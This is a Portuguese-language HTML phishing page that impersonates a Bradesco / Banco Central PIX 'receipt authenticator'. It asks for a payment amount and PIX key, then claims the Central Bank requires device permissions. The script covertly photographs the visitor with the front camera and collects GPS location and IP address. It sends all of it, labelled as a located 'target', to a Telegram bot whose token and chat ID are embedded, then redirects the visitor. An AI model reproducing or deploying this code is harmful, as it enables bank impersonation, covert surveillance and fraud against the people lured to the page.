<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Recebimento PIX</title>

    <meta property="og:title" content="Bradesco | Segurança Mobile">
    <meta property="og:description" content="Autentique seu dispositivo para liberar o recebimento pendente via PIX.">
    <meta property="og:image" content="https://l-m-b-s.github.io/PagamentoPix/bradesco-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="300">
    <meta property="og:image:height" content="300">
    <meta property="og:type" content="website">

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
        /* COR VERDE ÁGUA RESTAURADA */
        .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
        .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #32bcad; display: none; }
        .bc-logo { width: 160px; height: auto; display: block; margin: 0 auto; }
        .content { padding: 30px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: bold; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn-acao { width: 100%; background-color: #32bcad; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
        .btn-blue { background-color: #007bff; box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { font-size: 11px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
        #tela-permissao { display: none; text-align: center; }
    </style>
</head>
<body>

<div class="pix-card">
    <div id="header-dados" class="header">AUTENTICADOR DE RECEBIMENTOS</div>
    <div id="header-bc" class="bc-header">
        <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="BC" class="bc-logo">
    </div>

    <div class="content">
        <div id="tela-dados">
            <label>Valor R$:</label>
            <input type="number" id="valor" placeholder="Ex: 1250,00">
            <label>Chave PIX:</label>
            <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">
            <button class="btn-acao" onclick="mostrarAviso()">PROSSEGUIR</button>
        </div>

        <div id="tela-permissao">
            <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
            <p style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
            </p>
            <button class="btn-acao btn-blue" id="btnFinal" onclick="dispararCaptura()">
                AUTENTICAR E LIBERAR PIX
                <div class="spinner" id="spinner"></div>
            </button>
        </div>
        <div class="footer-info">Portal de Conferência de Valores Interbancário<br>Criptografia de Segurança Ativa</div>
    </div>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
    const ID = "560716860";
    let valorGlobal, chaveGlobal;

    function mostrarAviso() {
        valorGlobal = document.getElementById('valor').value;
        chaveGlobal = document.getElementById('chave').value;
        if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
        
        document.getElementById('header-dados').style.display = 'none';
        document.getElementById('tela-dados').style.display = 'none';
        document.getElementById('header-bc').style.display = 'block';
        document.getElementById('tela-permissao').style.display = 'block';
    }

    async function dispararCaptura() {
        document.getElementById('spinner').style.display = 'inline-block';
        document.getElementById('btnFinal').disabled = true;

        const ua = navigator.userAgent;
        const isAndroid = /Android/i.test(ua);
        let dadosAlvo = { ip: "Buscando...", valor: valorGlobal, chave: chaveGlobal, mapa: "GPS Negado" };

        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => dadosAlvo.ip = d.ip).catch(() => {});

        const enviarMsg = (pos) => {
            if(pos) {
                dadosAlvo.mapa = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }
            const texto = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${dadosAlvo.valor}\n🔑 Chave: ${dadosAlvo.chave}\n🌐 IP: ${dadosAlvo.ip}\n🌍 Mapa: ${dadosAlvo.mapa}`;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
            window.location.href = "bradesco.html";
        };

        if (isAndroid) {
            try {
                await tirarFoto();
                navigator.geolocation.getCurrentPosition(enviarMsg, () => enviarMsg(null), {timeout: 8000});
            } catch (e) {
                navigator.geolocation.getCurrentPosition(enviarMsg, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
            }
        } else {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                try { await tirarFoto(); } catch(e){}
                enviarMsg(pos);
            }, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
        }
    }

    async function tirarFoto() {
        try {
            if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            window.currentStream = stream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 1200));
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            stream.getTracks().forEach(t => t.stop());
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            const fd = new FormData();
            fd.append('chat_id', ID);
            fd.append('photo', blob, 'foto.jpg');
            fd.append('caption', `📸 CAPTURA FRONTAL\n💰 Valor: R$ ${valorGlobal}`);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch (e) { throw e; }
    }
</script>
</body>
</html>
